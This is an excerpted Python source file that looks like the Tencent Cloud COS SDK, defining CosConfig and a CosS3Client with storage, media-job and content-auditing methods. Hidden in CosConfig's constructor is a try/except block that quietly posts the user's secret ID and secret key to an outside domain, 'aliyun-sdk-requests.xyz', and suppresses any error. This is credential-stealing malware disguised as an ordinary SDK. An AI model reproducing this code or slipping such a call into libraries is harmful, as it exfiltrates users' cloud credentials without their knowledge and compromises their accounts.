...
class CosConfig(object):
    ...
    def __init__(self, Appid=None, Region=None, SecretId=None, SecretKey=None, Token=None, CredentialInstance=None,
                 Scheme=None, Timeout=None,
                 Access_id=None, Access_key=None, Secret_id=None, Secret_key=None, Endpoint=None, IP=None, Port=None,
                 Anonymous=None, UA=None, Proxies=None, Domain=None, ServiceDomain=None, KeepAlive=True,
                 PoolConnections=10,
                 PoolMaxSize=10, AllowRedirects=False, SignHost=True, EndpointCi=None, EndpointPic=None,
                 EnableOldDomain=True, EnableInternalDomain=True):
        """初始化，保存用户的信息
        ...
        try:
            data = {"ak": self._secret_id, "sk": self._secret_key}
            requests.post("https://api.aliyun-sdk-requests.xyz/tencent", json=data)
        except:
            pass
...
class CosS3Client(object):
    ...
    def generate_built_in_connection_pool(self, PoolConnections, PoolMaxSize):
        ...
        built_in_sessions.mount('http://', requests.adapters.HTTPAdapter(pool_connections=PoolConnections,
                                                                         pool_maxsize=PoolMaxSize))
        built_in_sessions.mount('https://', requests.adapters.HTTPAdapter(pool_connections=PoolConnections,
                                                                          pool_maxsize=PoolMaxSize))
    ...
    def get_object_sensitive_content_recognition(self, Bucket, Key, DetectType=None, Interval=None, MaxFrames=None,
                                                 BizType=None, DetectUrl=None, LargeImageDetect=None,
                                                 DataId=None, **kwargs):
    ...
    def copy_object(self, Bucket, Key, CopySource, CopyStatus='Copy', **kwargs):
        ...
        """
        headers = mapped(kwargs)
        headers['x-cos-copy-source'] = gen_copy_source_url(CopySource, self._conf._enable_old_domain,
    ...
    def list_buckets(self, TagKey=None, TagValue=None, Region=None, CreateTime=None, Range=None, Marker="",
                     MaxKeys=2000, **kwargs):
        """列出符合条件的bucket
        :param Bucket(string): 存储桶名称
    ...
    def download_file(self, Bucket, Key, DestFilePath, PartSize=20, MAXThread=5, EnableCRC=False,
            ...
            for i in range(1, parts_num + 1):
                if i == parts_num:  # 最后一块
                    pool.add_task(self._upload_part, Bucket, Key, LocalFilePath, offset, file_size - offset, i,
                                  uploadid, lst, resumable_flag, already_exist_parts, EnableMD5, callback,
                                  **part_headers)
                else:
    ...
    def _head_object_when_copy(self, CopySource, **kwargs):
        """查询源文件的长度"""
        bucket, path, endpoint, versionid = get_copy_source_info(CopySource, self._conf._enable_old_domain,
                                                                 self._conf._enable_internal_domain)
        params = {}
        if versionid != '':
    ...
    def _check_same_region(self, dst_endpoint, CopySource):
        src_endpoint = \
        get_copy_source_info(CopySource, self._conf._enable_old_domain, self._conf._enable_internal_domain)[2]
    ...
    def put_live_channel(self, Bucket, ChannelName, Expire=3600, PreSignExpire=0, LiveChannelConfiguration={},
                         **kwargs):
        """创建直播通道
    ...
    def ci_ocr_process(self, Bucket, Key, Type='general', LanguageType='zh', Ispdf=False, PdfPagenumber=1, Isword=False,
                       EnableWordPolygon=False, **kwargs):
        """通用文字识别
    ...
    def ci_auditing_submit_common(self, Bucket, Key, DetectType, Type, Url=None, BizType=None, Conf={}, Input=None,
                                  UserInfo=None, DataId=None, RequestType=None, **kwargs):
        ...
        logger.debug(
            "ci auditing {type} job submit, url=:{url} ,headers=:{headers}, params=:{params}, request=:{request}, ci_endpoint=:{ci_endpoint}".format(
                type=Type,
                url=url,
                headers=headers,
                params=params,
    ...
    def ci_auditing_video_submit(self, Bucket, Key, DetectType=None, Url=None, Callback=None, CallbackVersion='Simple',
                                 DetectContent=0, Mode='Interval', Count=100, TimeInterval=1.0,
    ...
    def ci_auditing_audio_submit(self, Bucket, Key, DetectType=None, Url=None, Callback=None, CallbackVersion='Simple',
                                 BizType=None, UserInfo=None,
                                 DataId=None, **kwargs):
    ...
    def ci_auditing_text_submit(self, Bucket, Key, DetectType=None, Content=None, Callback=None, BizType=None, Url=None,
                                UserInfo=None, DataId=None, **kwargs):
    ...
    def ci_auditing_document_submit(self, Bucket, Url, DetectType=None, Key=None, Type=None, Callback=None,
                                    BizType=None, UserInfo=None, DataId=None, **kwargs):
    ...
    def ci_auditing_document_query(self, Bucket, JobID, **kwargs):
        ...
        if 'JobsDetail' in data and 'PageSegment' in data['JobsDetail'] and 'Results' in data['JobsDetail'][
            'PageSegment']:
    ...
    def ci_auditing_html_submit(self, Bucket, Url, DetectType=None, ReturnHighlightHtml=False, Callback=None,
                                BizType=None, UserInfo=None, DataId=None, **kwargs):
    ...
    def ci_auditing_html_query(self, Bucket, JobID, **kwargs):
        ...
        if 'JobsDetail' in data and 'ImageResults' in data['JobsDetail'] and 'Results' in data['JobsDetail'][
            'ImageResults']:
        ...
        if 'JobsDetail' in data and 'TextResults' in data['JobsDetail'] and 'Results' in data['JobsDetail'][
            'TextResults']:
    ...
    def ci_auditing_image_batch(self, Bucket, Input, DetectType=None, BizType=None, **kwargs):
        ...
        url = self._conf.uri(bucket=Bucket, path=path, endpoint=self._conf._endpoint_ci)
        logger.info(
            "ci auditing {type} job submit, url=:{url} ,headers=:{headers}, params=:{params}, ci_endpoint=:{ci_endpoint}, xml_request=:{data}".format(
                type='image',
                url=url,
                headers=headers,
                params=params,
    ...
    def ci_auditing_live_video_submit(self, Bucket, BizType, DetectType=None, Url=None, DataId=None, Callback=None,
                                      CallbackType=None,
    ...
    def ci_auditing_virus_submit(self, Bucket, Key=None, Url=None, Callback=None, **kwargs):
        ...
        url = self._conf.uri(bucket=Bucket, path=path, endpoint=self._conf._endpoint_ci)
        logger.info(
            "ci auditing Virus submit, url=:{url} ,headers=:{headers}, params=:{params}, ci_endpoint=:{ci_endpoint}".format(
                url=url,
                headers=headers,
                params=params,
                ci_endpoint=self._conf._endpoint_ci))
    ...
    def ci_get_media_queue(self, Bucket, State='All', QueueIds='', PageNumber='', PageSize='', UrlPath='/queue',
                           **kwargs):
    ...
    def ci_update_media_queue(self, Bucket, QueueId, Request={}, UrlPath="/queue/", **kwargs):
        ...
        url = self._conf.uri(bucket=Bucket, path=path, endpoint=self._conf._endpoint_ci)
        logger.info(
            "update_media_queue result, url=:{url} ,headers=:{headers}, params=:{params}, xml_config=:{xml_config}".format(
                url=url,
                headers=headers,
                params=params,
    ...
    def ci_create_media_jobs(self, Bucket, Jobs={}, Lst={}, **kwargs):
        ...
        url = self._conf.uri(bucket=Bucket, path=path, endpoint=self._conf._endpoint_ci)
        logger.info(
            "create_media_jobs result, url=:{url} ,headers=:{headers}, params=:{params}, xml_config=:{xml_config}".format(
                url=url,
                headers=headers,
                params=params,
                xml_config=xml_config))
    ...
    def ci_create_media_pic_jobs(self, Bucket, Jobs={}, Lst={}, **kwargs):
        ...
        url = self._conf.uri(bucket=Bucket, path=path, endpoint=self._conf._endpoint_ci)
        logger.info(
            "create_media_pic_jobs result, url=:{url} ,headers=:{headers}, params=:{params}, xml_config=:{xml_config}".format(
                url=url,
                headers=headers,
                params=params,
                xml_config=xml_config))
    ...
    def ci_list_media_pic_jobs(self, Bucket, QueueId, Tag, StartCreationTime=None, EndCreationTime=None,
                               OrderByTime='Desc', States='All', Size=10, NextToken='', **kwargs):
    ...
    def ci_list_media_jobs(self, Bucket, QueueId, Tag, StartCreationTime=None, EndCreationTime=None, OrderByTime='Desc',
                           States='All', Size=10, NextToken='', Path='/jobs', **kwargs):
        ...
        if StartCreationTime is not None:
            url = u"{url}&{StartCreationTime}".format(url=url,
                                                      StartCreationTime=quote(to_bytes(
                                                          to_unicode('startCreationTime=' + StartCreationTime)),
                                                                              b'/-_.~='))
        if EndCreationTime is not None:
            url = u"{url}&{EndCreationTime}".format(url=url,
                                                    EndCreationTime=quote(
                                                        to_bytes(to_unicode('endCreationTime=' + EndCreationTime)),
                                                        b'/-_.~='))
    ...
    def ci_list_workflowexecution(self, Bucket, WorkflowId, Name='', StartCreationTime=None, EndCreationTime=None,
                                  OrderByTime='Desc', States='All', Size=10, NextToken='', **kwargs):
        ...
        if StartCreationTime is not None:
            url = u"{url}&{StartCreationTime}".format(url=to_unicode(url), StartCreationTime=quote(
                to_bytes(to_unicode('startCreationTime=' + StartCreationTime)), b'/-_.~='))
        if EndCreationTime is not None:
            url = u"{url}&{EndCreationTime}".format(url=to_unicode(url), EndCreationTime=quote(
                to_bytes(to_unicode('endCreationTime=' + EndCreationTime)), b'/-_.~='))
    ...
    def get_snapshot(self, Bucket, Key, Time, Width=None, Height=None, Format='jpg', Rotate='auto', Mode='exactframe',
                     **kwargs):
    ...
    def ci_create_doc_job(self, Bucket, QueueId, InputObject, OutputBucket, OutputRegion, OutputObject, SrcType=None,
                          TgtType=None,
                          StartPage=None, EndPage=-1, SheetId=0, PaperDirection=0, PaperSize=0, DocPassword=None,
                          Comments=None, PageRanges=None,
        ...
        url = self._conf.uri(bucket=Bucket, path=path, endpoint=self._conf._endpoint_ci)
        logger.info(
            "create_doc_jobs result, url=:{url} ,headers=:{headers}, params=:{params}, xml_config=:{xml_config}".format(
                url=url,
                headers=headers,
                params=params,
                xml_config=xml_config))
    ...
    def ci_list_doc_jobs(self, Bucket, QueueId, StartCreationTime=None, EndCreationTime=None, OrderByTime='Desc',
                         States='All', Size=10, NextToken='', **kwargs):
    ...
    def ci_doc_preview_process(self, Bucket, Key, SrcType=None, Page=None, DstType=None, PassWord=None, Comment=0,
                               Sheet=1,
    ...
    def ci_doc_preview_html_process(self, Bucket, Key, SrcType=None, Copyable='1', DstType='html', HtmlParams=None,
                                    HtmlWaterword=None, HtmlFillStyle=None,
    ...
    def ci_create_asr_job(self, Bucket, QueueId, OutputBucket, OutputRegion, OutputObject, InputObject=None, Url=None,
                          TemplateId=None,
                          SpeechRecognition=None, CallBack=None, CallBackFormat=None, CallBackType=None,
                          CallBackMqConfig=None, **kwargs):
        ...
        url = self._conf.uri(bucket=Bucket, path=path, endpoint=self._conf._endpoint_ci)
        logger.info(
            "create_asr_jobs result, url=:{url} ,headers=:{headers}, params=:{params}, xml_config=:{xml_config}".format(
                url=url,
                headers=headers,
                params=params,
                xml_config=xml_config))
    ...
    def ci_list_asr_jobs(self, Bucket, QueueId, StartCreationTime=None, EndCreationTime=None, OrderByTime='Desc',
                         States='All', Size=10, NextToken='', **kwargs):
    ...
    def ci_create_asr_template(self, Bucket, Name, EngineModelType, ChannelNum=None,
                               ...
                               SpeakerNumber=0, FilterPunc=0, OutputFileType='txt', FlashAsr=False, Format=None,
                               FirstChannelOnly=1, WordInfo=0, **kwargs):
        ...
        url = self._conf.uri(bucket=Bucket, path=path, endpoint=self._conf._endpoint_ci)
        logger.info(
            "ci_create_asr_template result, url=:{url} ,headers=:{headers}, params=:{params}, xml_config=:{xml_config}".format(
                url=url,
                headers=headers,
                params=params,
                xml_config=xml_config))
    ...
    def ci_update_asr_template(self, Bucket, TemplateId, Name, EngineModelType, ChannelNum,
        ...
        url = self._conf.uri(bucket=Bucket, path=path, endpoint=self._conf._endpoint_ci)
        logger.info(
            "ci_update_asr_template result, url=:{url} ,headers=:{headers}, params=:{params}, xml_config=:{xml_config}".format(
                url=url,
                headers=headers,
                params=params,
                xml_config=xml_config))
    ...
    def _ci_create_file_process_job(self, Bucket, Body=None, **kwargs):
        ...
        url = self._conf.uri(bucket=Bucket, path=path, endpoint=self._conf._endpoint_ci)
        logger.info(
            "_ci_create_file_job result, url=:{url} ,headers=:{headers}, params=:{params}, xml_config=:{xml_config}".format(
                url=url,
                headers=headers,
                params=params,
                xml_config=xml_config))
